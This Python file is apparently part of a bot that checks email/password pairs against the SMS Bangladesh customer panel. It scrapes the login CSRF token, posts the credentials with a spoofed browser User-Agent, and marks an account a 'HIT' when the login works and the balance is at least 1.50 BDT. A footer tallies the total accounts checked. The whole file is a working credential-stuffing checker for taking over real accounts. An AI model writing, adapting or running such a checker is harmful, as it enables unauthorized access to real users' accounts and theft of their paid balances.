import requests
import time
from bs4 import BeautifulSoup

def check_smsbd(email, password):
    # First request to get the login page and token
    session = requests.Session()
    login_page = session.get("https://panel.smsbangladesh.com/login")
    
    # Extract the CSRF token from the login page
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': '_token'})
    
    if not token_input:
        return "Dead", "Failed to retrieve CSRF token."
    
    token = token_input.get('value', '')
    
    # Prepare the login data
    data = {
        '_token': token,
        'email': email,
        'password': password
    }
    
    # Headers to mimic a real browser
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # Second request to post the login data
    login_response = session.post("https://panel.smsbangladesh.com/login", data=data, headers=headers)
    
    # Check if the login was successful
    if "These credentials do not match our records." in login_response.text:
        return "Dead", "Invalid Credentials🚫"
    
    # Parse the account details if login was successful
    soup = BeautifulSoup(login_response.text, 'html.parser')
    name = soup.find('span', {'class': 'logged-name hidden-md-down'}).text.strip() if soup.find('span', {'class': 'logged-name hidden-md-down'}) else "N/A"
    balance = soup.find('strong').text.strip() if soup.find('strong') else "N/A"

    if balance and float(balance) >= 1.50:
        response_message = (
            f"HIT SUCCESSFULLY✅\n"
            f"Name: {name}\n"
            f"Balance: {balance} BDT\n"
        )
        return "Hit", response_message
    else:
        return "Dead", f"Insufficient balance or unable to retrieve balance. Balance: {balance} BDT"

def get_footer_info(total, start_time, username):
    elapsed_time = round(time.time() - start_time, 2)
    return f"\n－－－－－－－－－－－－－－－－\n🔹 Total Accounts Checked - {total}\n⏱️ Time Taken - {elapsed_time} seconds\n▫️ Checked by: {username}\n⚡️ Bot by - AFTAB 👑\n－－－－－－－－－－－－－－－－"
